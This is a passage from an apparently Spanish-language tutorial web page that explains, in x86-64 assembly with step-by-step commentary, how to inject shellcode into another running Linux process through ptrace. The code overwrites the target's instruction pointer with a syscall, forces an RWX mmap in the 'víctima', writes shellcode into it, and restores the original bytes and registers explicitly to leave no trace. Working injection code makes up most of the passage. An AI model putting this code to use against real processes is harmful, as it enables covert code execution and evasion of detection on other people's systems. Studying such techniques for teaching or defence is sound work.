</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">r13</span><span class="p">,</span><span class="w"> </span><span class="nb">r11</span><span class="w">             </span><span class="c1">; Backup en r13</span>
</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a><span class="w">    </span><span class="nf">and</span><span class="w"> </span><span class="nb">r11</span><span class="p">,</span><span class="w"> </span><span class="mh">0xFFFFFFFFFFFF0000</span><span class="w">  </span><span class="c1">; Limpiar 2 bytes bajos</span>
</span><span id="__span-19-4"><a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a><span class="w">    </span><span class="nf">or</span><span class="w"> </span><span class="nb">r11</span><span class="p">,</span><span class="w"> </span><span class="mh">0x000000000000050F</span><span class="w">   </span><span class="c1">; Insertar &quot;syscall&quot; (0F 05)</span>
</span></code></pre></div>
<p><strong>¿Qué hace?</strong></p>
<ol>
<li>Guardamos el valor original en R13 (lo necesitaremos para restaurar).</li>
<li>Limpiamos los 2 bytes menos significativos del qword.</li>
<li>Insertamos los bytes <code>0F 05</code> (instrucción <code>syscall</code> en x86-64).</li>
</ol>
<p><strong>¿Por qué 0x050F y no 0x0F05?</strong></p>
<p>Por little-endian. Queremos que en memoria quede <code>0F 05</code>, así que el valor en el registro debe ser <code>050F</code> (bytes invertidos).</p>
<div class="language-nasm highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="w">    </span><span class="c1">; PTRACE_POKEDATA - Escribir syscall</span>
</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">101</span>
</span><span id="__span-20-3"><a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="mi">5</span><span class="w">               </span><span class="c1">; PTRACE_POKEDATA</span>
</span><span id="__span-20-4"><a id="__codelineno-20-4" name="__codelineno-20-4" href="#__codelineno-20-4"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="nb">r15</span>
</span><span id="__span-20-5"><a id="__codelineno-20-5" name="__codelineno-20-5" href="#__codelineno-20-5"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdx</span><span class="p">,</span><span class="w"> </span><span class="nb">r12</span><span class="w">             </span><span class="c1">; Dirección donde escribir</span>
</span><span id="__span-20-6"><a id="__codelineno-20-6" name="__codelineno-20-6" href="#__codelineno-20-6"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">r10</span><span class="p">,</span><span class="w"> </span><span class="nb">r11</span><span class="w">             </span><span class="c1">; Valor con &quot;syscall&quot; inyectado</span>
</span><span id="__span-20-7"><a id="__codelineno-20-7" name="__codelineno-20-7" href="#__codelineno-20-7"></a><span class="w">    </span><span class="nf">syscall</span>
</span></code></pre></div>
<p><strong>¿Qué hace?</strong></p>
<p>Sobrescribimos los primeros 2 bytes donde apunta el RIP con la instrucción <code>syscall</code>. Ahora, cuando el proceso continúe, ejecutará <code>syscall</code> en lugar de su instrucción original.</p>
<hr />
<h3 id="paso-4-configuracion-de-registros-para-mmap">Paso 4: Configuración de registros para MMAP<a class="headerlink" href="#paso-4-configuracion-de-registros-para-mmap" title="Permanent link">&para;</a></h3>
<div class="language-nasm highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="kt">qword</span><span class="w"> </span><span class="p">[</span><span class="nv">regs</span><span class="o">+</span><span class="mh">0x50</span><span class="p">],</span><span class="w"> </span><span class="mi">9</span><span class="w">       </span><span class="c1">; RAX = 9 (syscall mmap)</span>
</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="kt">qword</span><span class="w"> </span><span class="p">[</span><span class="nv">regs</span><span class="o">+</span><span class="mh">0x70</span><span class="p">],</span><span class="w"> </span><span class="mi">0</span><span class="w">       </span><span class="c1">; RDI = 0 (addr NULL)</span>
</span><span id="__span-21-3"><a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="kt">qword</span><span class="w"> </span><span class="p">[</span><span class="nv">regs</span><span class="o">+</span><span class="mh">0x68</span><span class="p">],</span><span class="w"> </span><span class="mi">4096</span><span class="w">    </span><span class="c1">; RSI = 4096 (tamaño)</span>
</span><span id="__span-21-4"><a id="__codelineno-21-4" name="__codelineno-21-4" href="#__codelineno-21-4"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="kt">qword</span><span class="w"> </span><span class="p">[</span><span class="nv">regs</span><span class="o">+</span><span class="mh">0x60</span><span class="p">],</span><span class="w"> </span><span class="mi">7</span><span class="w">       </span><span class="c1">; RDX = 7 (RWX)</span>
</span><span id="__span-21-5"><a id="__codelineno-21-5" name="__codelineno-21-5" href="#__codelineno-21-5"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="kt">qword</span><span class="w"> </span><span class="p">[</span><span class="nv">regs</span><span class="o">+</span><span class="mh">0x38</span><span class="p">],</span><span class="w"> </span><span class="mi">34</span><span class="w">      </span><span class="c1">; R10 = 34 (PRIVATE|ANONYMOUS)</span>
</span><span id="__span-21-6"><a id="__codelineno-21-6" name="__codelineno-21-6" href="#__codelineno-21-6"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="kt">qword</span><span class="w"> </span><span class="p">[</span><span class="nv">regs</span><span class="o">+</span><span class="mh">0x48</span><span class="p">],</span><span class="w"> </span><span class="o">-</span><span class="mi">1</span><span class="w">      </span><span class="c1">; R8 = -1 (no fd)</span>
</span><span id="__span-21-7"><a id="__codelineno-21-7" name="__codelineno-21-7" href="#__codelineno-21-7"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="kt">qword</span><span class="w"> </span><span class="p">[</span><span class="nv">regs</span><span class="o">+</span><span class="mh">0x40</span><span class="p">],</span><span class="w"> </span><span class="mi">0</span><span class="w">       </span><span class="c1">; R9 = 0 (offset)</span>
</span></code></pre></div>
<p><strong>¿Qué hace?</strong></p>
<p>Configuramos los registros en nuestro buffer para que cuando los apliquemos al tracee, ejecute:</p>
<div class="language-c highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="n">mmap</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="mi">4096</span><span class="p">,</span><span class="w"> </span><span class="n">PROT_READ</span><span class="o">|</span><span class="n">PROT_WRITE</span><span class="o">|</span><span class="n">PROT_EXEC</span><span class="p">,</span><span class="w"> </span><span class="n">MAP_PRIVATE</span><span class="o">|</span><span class="n">MAP_ANONYMOUS</span><span class="p">,</span><span class="w"> </span><span class="mi">-1</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
</span></code></pre></div>
<p>Esto reservará 4096 bytes de memoria con permisos de lectura, escritura y ejecución.</p>
<p><strong>Desglose de argumentos:</strong></p>
<table>
<thead>
<tr>
<th>Registro</th>
<th>Offset</th>
<th>Valor</th>
<th>Significado</th>
</tr>
</thead>
<tbody>
<tr>
<td>RAX</td>
<td>0x50</td>
<td>9</td>
<td>Número de syscall mmap</td>
</tr>
<tr>
<td>RDI</td>
<td>0x70</td>
<td>0</td>
<td>addr = NULL (kernel elige)</td>
</tr>
<tr>
<td>RSI</td>
<td>0x68</td>
<td>4096</td>
<td>length = 4096 bytes</td>
</tr>
<tr>
<td>RDX</td>
<td>0x60</td>
<td>7</td>
<td>prot = RWX</td>
</tr>
<tr>
<td>R10</td>
<td>0x38</td>
<td>34</td>
<td>flags = PRIVATE | ANONYMOUS</td>
</tr>
<tr>
<td>R8</td>
<td>0x48</td>
<td>-1</td>
<td>fd = -1 (no archivo)</td>
</tr>
<tr>
<td>R9</td>
<td>0x40</td>
<td>0</td>
<td>offset = 0</td>
</tr>
</tbody>
</table>
<div class="language-nasm highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="w">    </span><span class="c1">; PTRACE_SETREGS - Aplicar configuración</span>
</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">101</span>
</span><span id="__span-23-3"><a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="mi">13</span><span class="w">              </span><span class="c1">; PTRACE_SETREGS</span>
</span><span id="__span-23-4"><a id="__codelineno-23-4" name="__codelineno-23-4" href="#__codelineno-23-4"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="nb">r15</span>
</span><span id="__span-23-5"><a id="__codelineno-23-5" name="__codelineno-23-5" href="#__codelineno-23-5"></a><span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">rdx</span><span class="p">,</span><span class="w"> </span><span class="nb">rdx</span>
</span><span id="__span-23-6"><a id="__codelineno-23-6" name="__codelineno-23-6" href="#__codelineno-23-6"></a><span class="w">    </span><span class="nf">lea</span><span class="w"> </span><span class="nb">r10</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="ow">rel</span><span class="w"> </span><span class="nv">regs</span><span class="p">]</span>
</span><span id="__span-23-7"><a id="__codelineno-23-7" name="__codelineno-23-7" href="#__codelineno-23-7"></a><span class="w">    </span><span class="nf">syscall</span>
</span></code></pre></div>
<p>Aplicamos estos registros modificados al proceso víctima.</p>
<hr />
<h3 id="paso-5-ejecucion-controlada-de-la-syscall-mmap">Paso 5: Ejecución controlada de la syscall MMAP<a class="headerlink" href="#paso-5-ejecucion-controlada-de-la-syscall-mmap" title="Permanent link">&para;</a></h3>
<div class="language-nasm highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a><span class="w">    </span><span class="c1">; PTRACE_SINGLESTEP</span>
</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">101</span>
</span><span id="__span-24-3"><a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="mi">9</span><span class="w">               </span><span class="c1">; PTRACE_SINGLESTEP</span>
</span><span id="__span-24-4"><a id="__codelineno-24-4" name="__codelineno-24-4" href="#__codelineno-24-4"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="nb">r15</span>
</span><span id="__span-24-5"><a id="__codelineno-24-5" name="__codelineno-24-5" href="#__codelineno-24-5"></a><span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">rdx</span><span class="p">,</span><span class="w"> </span><span class="nb">rdx</span>
</span><span id="__span-24-6"><a id="__codelineno-24-6" name="__codelineno-24-6" href="#__codelineno-24-6"></a><span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">r10</span><span class="p">,</span><span class="w"> </span><span class="nb">r10</span>
</span><span id="__span-24-7"><a id="__codelineno-24-7" name="__codelineno-24-7" href="#__codelineno-24-7"></a><span class="w">    </span><span class="nf">syscall</span>
</span></code></pre></div>
<p><strong>¿Qué hace?</strong></p>
<p>Le decimos al tracee que ejecute <strong>una sola instrucción</strong> y se detenga. Esa instrucción es el <code>syscall</code> que inyectamos, que ahora ejecutará <code>mmap</code> con los argumentos que configuramos.</p>
<div class="language-nasm highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a><span class="w">    </span><span class="c1">; WAIT4 - Esperar a que se detenga</span>
</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">61</span>
</span><span id="__span-25-3"><a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="nb">r15</span>
</span><span id="__span-25-4"><a id="__codelineno-25-4" name="__codelineno-25-4" href="#__codelineno-25-4"></a><span class="w">    </span><span class="nf">sub</span><span class="w"> </span><span class="nb">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">8</span>
</span><span id="__span-25-5"><a id="__codelineno-25-5" name="__codelineno-25-5" href="#__codelineno-25-5"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="nb">rsp</span>
</span><span id="__span-25-6"><a id="__codelineno-25-6" name="__codelineno-25-6" href="#__codelineno-25-6"></a><span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">rdx</span><span class="p">,</span><span class="w"> </span><span class="nb">rdx</span>
</span><span id="__span-25-7"><a id="__codelineno-25-7" name="__codelineno-25-7" href="#__codelineno-25-7"></a><span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">r10</span><span class="p">,</span><span class="w"> </span><span class="nb">r10</span>
</span><span id="__span-25-8"><a id="__codelineno-25-8" name="__codelineno-25-8" href="#__codelineno-25-8"></a><span class="w">    </span><span class="nf">syscall</span>
</span></code></pre></div>
<p>Esperamos a que el proceso se detenga después de ejecutar la instrucción.</p>
<div class="language-nasm highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a><span class="w">    </span><span class="c1">; PTRACE_GETREGS - Obtener resultado</span>
</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">101</span>
</span><span id="__span-26-3"><a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="mi">12</span>
</span><span id="__span-26-4"><a id="__codelineno-26-4" name="__codelineno-26-4" href="#__codelineno-26-4"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="nb">r15</span>
</span><span id="__span-26-5"><a id="__codelineno-26-5" name="__codelineno-26-5" href="#__codelineno-26-5"></a><span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">rdx</span><span class="p">,</span><span class="w"> </span><span class="nb">rdx</span>
</span><span id="__span-26-6"><a id="__codelineno-26-6" name="__codelineno-26-6" href="#__codelineno-26-6"></a><span class="w">    </span><span class="nf">lea</span><span class="w"> </span><span class="nb">r10</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="ow">rel</span><span class="w"> </span><span class="nv">regs_sys</span><span class="p">]</span>
</span><span id="__span-26-7"><a id="__codelineno-26-7" name="__codelineno-26-7" href="#__codelineno-26-7"></a><span class="w">    </span><span class="nf">syscall</span>
</span></code></pre></div>
<p>Obtenemos los registros después de la syscall. El resultado de <code>mmap</code> estará en RAX.</p>
<hr />
<h3 id="paso-6-obtencion-del-resultado-de-mmap">Paso 6: Obtención del resultado de MMAP<a class="headerlink" href="#paso-6-obtencion-del-resultado-de-mmap" title="Permanent link">&para;</a></h3>
<div class="language-nasm highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a><span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">r12</span><span class="p">,</span><span class="w"> </span><span class="nb">r12</span>
</span><span id="__span-27-2"><a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">r12</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="nv">regs_sys</span><span class="o">+</span><span class="mh">0x50</span><span class="p">]</span><span class="w">    </span><span class="c1">; RAX contiene la dirección mmap</span>
</span></code></pre></div>
<p><strong>¿Qué hace?</strong></p>
<p>Extraemos el valor de RAX del buffer de registros. Este valor es la dirección base de la memoria que acabamos de reservar. Esta memoria tiene permisos RWX, perfecta para nuestro shellcode.</p>
<hr />
<h3 id="paso-7-restauracion-de-los-bytes-originales">Paso 7: Restauración de los bytes originales<a class="headerlink" href="#paso-7-restauracion-de-los-bytes-originales" title="Permanent link">&para;</a></h3>
<div class="language-nasm highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a><span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">r14</span><span class="p">,</span><span class="w"> </span><span class="nb">r14</span>
</span><span id="__span-28-2"><a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">r14</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="nv">regs_ori</span><span class="o">+</span><span class="mh">0x80</span><span class="p">]</span><span class="w">    </span><span class="c1">; RIP original</span>
</span><span id="__span-28-3"><a id="__codelineno-28-3" name="__codelineno-28-3" href="#__codelineno-28-3"></a>
</span><span id="__span-28-4"><a id="__codelineno-28-4" name="__codelineno-28-4" href="#__codelineno-28-4"></a><span class="w">    </span><span class="c1">; PTRACE_POKEDATA - Restaurar bytes</span>
</span><span id="__span-28-5"><a id="__codelineno-28-5" name="__codelineno-28-5" href="#__codelineno-28-5"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">101</span>
</span><span id="__span-28-6"><a id="__codelineno-28-6" name="__codelineno-28-6" href="#__codelineno-28-6"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="mi">5</span>
</span><span id="__span-28-7"><a id="__codelineno-28-7" name="__codelineno-28-7" href="#__codelineno-28-7"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="nb">r15</span>
</span><span id="__span-28-8"><a id="__codelineno-28-8" name="__codelineno-28-8" href="#__codelineno-28-8"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdx</span><span class="p">,</span><span class="w"> </span><span class="nb">r14</span><span class="w">               </span><span class="c1">; Dirección original del RIP</span>
</span><span id="__span-28-9"><a id="__codelineno-28-9" name="__codelineno-28-9" href="#__codelineno-28-9"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">r10</span><span class="p">,</span><span class="w"> </span><span class="nb">r13</span><span class="w">               </span><span class="c1">; Bytes originales (guardados en paso 3)</span>
</span><span id="__span-28-10"><a id="__codelineno-28-10" name="__codelineno-28-10" href="#__codelineno-28-10"></a><span class="w">    </span><span class="nf">syscall</span>
</span></code></pre></div>
<p><strong>¿Qué hace?</strong></p>
<p>Restauramos los bytes originales que sobrescribimos con <code>syscall</code>. Esto es importante porque:</p>
<ol>
<li>No queremos dejar rastros de nuestra modificación.</li>
<li>El código original debe poder ejecutarse si el proceso vuelve a esa dirección.</li>
</ol>
<hr />
<h3 id="paso-8-restauracion-de-los-registros-originales">Paso 8: Restauración de los registros originales<a class="headerlink" href="#paso-8-restauracion-de-los-registros-originales" title="Permanent link">&para;</a></h3>
<div class="language-nasm highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a><span class="w">    </span><span class="c1">; PTRACE_SETREGS</span>
</span><span id="__span-29-2"><a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">101</span>
</span><span id="__span-29-3"><a id="__codelineno-29-3" name="__codelineno-29-3" href="#__codelineno-29-3"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="mi">13</span>
</span><span id="__span-29-4"><a id="__codelineno-29-4" name="__codelineno-29-4" href="#__codelineno-29-4"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="nb">r15</span>
</span><span id="__span-29-5"><a id="__codelineno-29-5" name="__codelineno-29-5" href="#__codelineno-29-5"></a><span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">rdx</span><span class="p">,</span><span class="w"> </span><span class="nb">rdx</span>
</span><span id="__span-29-6"><a id="__codelineno-29-6" name="__codelineno-29-6" href="#__codelineno-29-6"></a><span class="w">    </span><span class="nf">lea</span><span class="w"> </span><span class="nb">r10</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="ow">rel</span><span class="w"> </span><span class="nv">regs_ori</span><span class="p">]</span>
</span><span id="__span-29-7"><a id="__codelineno-29-7" name="__codelineno-29-7" href="#__codelineno-29-7"></a><span class="w">    </span><span class="nf">syscall</span>
</span></code></pre></div>
<p><strong>¿Qué hace?</strong></p>
<p>Restauramos todos los registros del proceso a sus valores originales. En este punto, el proceso está exactamente como estaba antes de que lo tocáramos (excepto que ahora tiene una región de memoria RWX adicional).</p>
<hr />
<h3 id="paso-9-almacenamiento-del-rip-de-retorno">Paso 9: Almacenamiento del RIP de retorno<a class="headerlink" href="#paso-9-almacenamiento-del-rip-de-retorno" title="Permanent link">&para;</a></h3>
<div class="language-nasm highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a><span class="w">    </span><span class="c1">; PTRACE_POKEDATA</span>
</span><span id="__span-30-2"><a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">101</span>
</span><span id="__span-30-3"><a id="__codelineno-30-3" name="__codelineno-30-3" href="#__codelineno-30-3"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="mi">5</span>
</span><span id="__span-30-4"><a id="__codelineno-30-4" name="__codelineno-30-4" href="#__codelineno-30-4"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="nb">r15</span>
</span><span id="__span-30-5"><a id="__codelineno-30-5" name="__codelineno-30-5" href="#__codelineno-30-5"></a><span class="w">    </span><span class="nf">lea</span><span class="w"> </span><span class="nb">rdx</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="nb">r12</span><span class="o">+</span><span class="mi">4088</span><span class="p">]</span><span class="w">        </span><span class="c1">; Final de la página mmap</span>
</span><span id="__span-30-6"><a id="__codelineno-30-6" name="__codelineno-30-6" href="#__codelineno-30-6"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">r10</span><span class="p">,</span><span class="w"> </span><span class="nb">r14</span><span class="w">               </span><span class="c1">; RIP original</span>
</span><span id="__span-30-7"><a id="__codelineno-30-7" name="__codelineno-30-7" href="#__codelineno-30-7"></a><span class="w">    </span><span class="nf">syscall</span>
</span></code></pre></div>
<p><strong>¿Qué hace?</strong></p>
<p>Escribimos el RIP original al final de la región mmap (offset +4088, dejando espacio para los 8 bytes del qword). </p>
<p><strong>¿Por qué?</strong></p>
<p>Nuestro shellcode usa <code>fork()</code>. El proceso padre necesita saber a dónde volver después de ejecutar el shellcode. Guardamos esta dirección de retorno en un lugar conocido (final de la página mmap) donde el shellcode puede encontrarla.</p>
<hr />
<h3 id="paso-10-inyeccion-del-shellcode">Paso 10: Inyección del shellcode<a class="headerlink" href="#paso-10-inyeccion-del-shellcode" title="Permanent link">&para;</a></h3>
<div class="language-nasm highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a><span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">r13</span><span class="p">,</span><span class="w"> </span><span class="nb">r13</span>
</span><span id="__span-31-2"><a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a><span class="w">    </span><span class="nf">lea</span><span class="w"> </span><span class="nb">r13</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="ow">rel</span><span class="w"> </span><span class="nv">shellcode</span><span class="p">]</span><span class="w">   </span><span class="c1">; Puntero al shellcode</span>
</span><span id="__span-31-3"><a id="__codelineno-31-3" name="__codelineno-31-3" href="#__codelineno-31-3"></a><span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">r14</span><span class="p">,</span><span class="w"> </span><span class="nb">r14</span>
</span><span id="__span-31-4"><a id="__codelineno-31-4" name="__codelineno-31-4" href="#__codelineno-31-4"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">r14</span><span class="p">,</span><span class="w"> </span><span class="nv">sc_len</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="mi">8</span><span class="w">        </span><span class="c1">; Número de qwords a escribir</span>
</span><span id="__span-31-5"><a id="__codelineno-31-5" name="__codelineno-31-5" href="#__codelineno-31-5"></a><span class="w">    </span><span class="nf">push</span><span class="w"> </span><span class="nb">r12</span><span class="w">                   </span><span class="c1">; Guardar dirección base</span>
</span><span id="__span-31-6"><a id="__codelineno-31-6" name="__codelineno-31-6" href="#__codelineno-31-6"></a>
</span><span id="__span-31-7"><a id="__codelineno-31-7" name="__codelineno-31-7" href="#__codelineno-31-7"></a><span class="w">    </span><span class="nl">.loop_inj:</span>
</span><span id="__span-31-8"><a id="__codelineno-31-8" name="__codelineno-31-8" href="#__codelineno-31-8"></a><span class="w">        </span><span class="nf">cmp</span><span class="w"> </span><span class="nb">r14</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span>
</span><span id="__span-31-9"><a id="__codelineno-31-9" name="__codelineno-31-9" href="#__codelineno-31-9"></a><span class="w">        </span><span class="nf">jz</span><span class="w"> </span><span class="nv">.done</span>
</span><span id="__span-31-10"><a id="__codelineno-31-10" name="__codelineno-31-10" href="#__codelineno-31-10"></a>
</span><span id="__span-31-11"><a id="__codelineno-31-11" name="__codelineno-31-11" href="#__codelineno-31-11"></a><span class="w">        </span><span class="c1">; PTRACE_POKEDATA</span>
</span><span id="__span-31-12"><a id="__codelineno-31-12" name="__codelineno-31-12" href="#__codelineno-31-12"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">101</span>
</span><span id="__span-31-13"><a id="__codelineno-31-13" name="__codelineno-31-13" href="#__codelineno-31-13"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="mi">5</span>
</span><span id="__span-31-14"><a id="__codelineno-31-14" name="__codelineno-31-14" href="#__codelineno-31-14"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="nb">r15</span>
</span><span id="__span-31-15"><a id="__codelineno-31-15" name="__codelineno-31-15" href="#__codelineno-31-15"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdx</span><span class="p">,</span><span class="w"> </span><span class="nb">r12</span><span class="w">           </span><span class="c1">; Dirección destino</span>
</span><span id="__span-31-16"><a id="__codelineno-31-16" name="__codelineno-31-16" href="#__codelineno-31-16"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="nb">r10</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="nb">r13</span><span class="p">]</span><span class="w">         </span><span class="c1">; 8 bytes del shellcode</span>
</span><span id="__span-31-17"><a id="__codelineno-31-17" name="__codelineno-31-17" href="#__codelineno-31-17"></a><span class="w">        </span><span class="nf">syscall</span>
</span><span id="__span-31-18"><a id="__codelineno-31-18" name="__codelineno-31-18" href="#__codelineno-31-18"></a>
</span><span id="__span-31-19"><a id="__codelineno-31-19" name="__codelineno-31-19" href="#__codelineno-31-19"></a><span class="w">        </span><span class="nf">add</span><span class="w"> </span><span class="nb">r12</span><span class="p">,</span><span class="w"> </span><span class="mi">8</span><span class="w">             </span><span class="c1">; Avanzar destino</span>
